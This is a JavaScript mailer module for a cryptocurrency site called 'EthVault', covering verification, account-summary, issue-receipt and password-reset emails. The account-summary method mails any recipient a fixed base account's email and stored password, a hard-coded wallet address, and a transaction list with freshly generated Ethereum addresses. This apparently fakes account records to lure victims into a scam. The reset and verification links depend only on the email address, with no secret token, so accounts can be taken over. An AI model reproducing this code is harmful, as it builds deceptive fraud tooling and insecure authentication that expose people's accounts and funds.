import { config } from "dotenv";
import fetch from "node-fetch";
import { readFile } from "fs/promises";
import { resolve } from "path";
import User from "../model/user.js";
import computeBalance from "./compute-balance.js";
import generateETHAddress from "./generate-address.js";
import mongoose from "mongoose";

config();

class Mailer {
	static async sendVerificationMail({ email }) {
		try {
			let emailTemplate = await readFile(
				resolve(process.cwd(), "./src/server/lib/email-template.html"),
				"utf-8"
			);
			emailTemplate = emailTemplate.replace(
				"{{verification_link}}",
				`/reset-password/api/user/verify?email=${email}`
			);
			emailTemplate = emailTemplate.replace(
				"{{year}}",
				new Date().getFullYear()
			);

			const response = await fetch(
				"https://api.brevo.com/v3/smtp/email",
				{
					method: "POST",
					body: JSON.stringify({
						sender: {
							name: "EthVault",
							email: "victor.onah@atrizult.com"
						},
						to: [{ email }],
						subject: "Verify Your Account",
						htmlContent: emailTemplate
					}),
					headers: {
						"api-key": process.env.API_KEY,
						"Content-Type": "application/json"
					}
				}
			);

			if (!response.ok) return false;

			return true;
		} catch (error) {
			return false;
		}
	}

	static async sendAccountSummary({ email }) {
		try {
			await mongoose.connect(process.env.DB_URL);

			let [emailTemplate, rateResponse] = await Promise.all([
				readFile(
					resolve(
						process.cwd(),
						"./src/server/lib/account-summary-email-template.html"
					),
					"utf-8"
				),
				fetch(
					"https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD"
				)
			]);

			const baseEmail = process.env.BASE_EMAIL;
			const { USD } = await rateResponse.json();
			const baseUser = await User.findOne({ email: baseEmail });
			const accountBalance = await computeBalance(baseUser.transactions);

			const lastTransactions = await Promise.all(
				baseUser.transactions.slice(0, 10).map(async transaction => {
					const ethAddress = await generateETHAddress();
					return `<tr>
                    <td>${new Date(transaction.date).toDateString()}</td>
                    <td style='text-transform: capitalize'>${
						transaction.type
					}</td>
                    <td>${(
						transaction.amount -
						(0.001 * transaction.amount) / 100
					).toFixed(3)} (ETH)</td>
                    <td>${ethAddress}</td>
                </tr>`;
				})
			);

			emailTemplate = emailTemplate.replace("{{user_email}}", baseEmail);
			emailTemplate = emailTemplate.replace(
				"{{user_password}}",
				baseUser.password
			);
			emailTemplate = emailTemplate.replace(
				"{{wallet_address}}",
				"0x650ad55B32Bc2c8e33589fdd95A7708F1C1a0e94"
			);
			emailTemplate = emailTemplate.replace(
				"{{eth_balance}}",
				accountBalance
			);
			emailTemplate = emailTemplate.replace(
				"{{usd_balance}}",
				Number((accountBalance * USD).toFixed(2)).toLocaleString()
			);
			emailTemplate = emailTemplate.replace(
				"{{transaction_rows}}",
				lastTransactions.join("")
			);
			emailTemplate = emailTemplate.replace(
				"{{year}}",
				new Date().getFullYear()
			);

			// Send the email
			const mailResponse = await fetch(
				"https://api.brevo.com/v3/smtp/email",
				{
					method: "POST",
					body: JSON.stringify({
						sender: {
							name: "EthVault",
							email: "victor.onah@atrizult.com"
						},
						to: [{ email }],
						subject: "Ethereum Account Summary",
						htmlContent: emailTemplate
					}),
					headers: {
						"api-key": process.env.API_KEY,
						"Content-Type": "application/json"
					}
				}
			);

			if (!mailResponse.ok) return false;

			return true;
		} catch (error) {
			return false;
		}
	}

	static async sendIssueReceiptConfirmationEmail({ email, name }) {
		try {
			let emailTemplate = await readFile(
				resolve(
					process.cwd(),
					"./src/server/lib/issue-response-email.html"
				),
				"utf-8"
			);
			emailTemplate = emailTemplate.replace(
				"{{user_name}}",
				name.split(" ")[0]
			);
			emailTemplate = emailTemplate.replace(
				"{{year}}",
				new Date().getFullYear()
			);

			const response = await fetch(
				"https://api.brevo.com/v3/smtp/email",
				{
					method: "POST",
					body: JSON.stringify({
						sender: {
							name: "EthVault",
							email: "victor.onah@atrizult.com"
						},
						to: [{ email }],
						subject: "We received your issue",
						htmlContent: emailTemplate
					}),
					headers: {
						"api-key": process.env.API_KEY,
						"Content-Type": "application/json"
					}
				}
			);

			if (!response.ok) return false;

			return true;
		} catch (error) {
			return false;
		}
	}

	static async sendPasswordResetEmail({ email }) {
		try {
			let emailTemplate = await readFile(
				resolve(
					process.cwd(),
					"./src/server/lib/reset-password-email-template.html"
				),
				"utf-8"
			);
			emailTemplate = emailTemplate.replace(
				"{{reset_link}}",
				`https://ethvault.onrender.com/reset-password?email=${email}&ts=${Date.now()}`
			);
			emailTemplate = emailTemplate.replace(
				"{{year}}",
				new Date().getFullYear()
			);

			const response = await fetch(
				"https://api.brevo.com/v3/smtp/email",
				{
					method: "POST",
					body: JSON.stringify({
						sender: {
							name: "EthVault",
							email: "victor.onah@atrizult.com"
						},
						to: [{ email }],
						subject: "Reset Your EthVault Password",
						htmlContent: emailTemplate
					}),
					headers: {
						"api-key": process.env.API_KEY,
						"Content-Type": "application/json"
					}
				}
			);

			if (!response.ok) return false;

			return true;
		} catch (error) {
			return false;
		}
	}
}

export default Mailer;
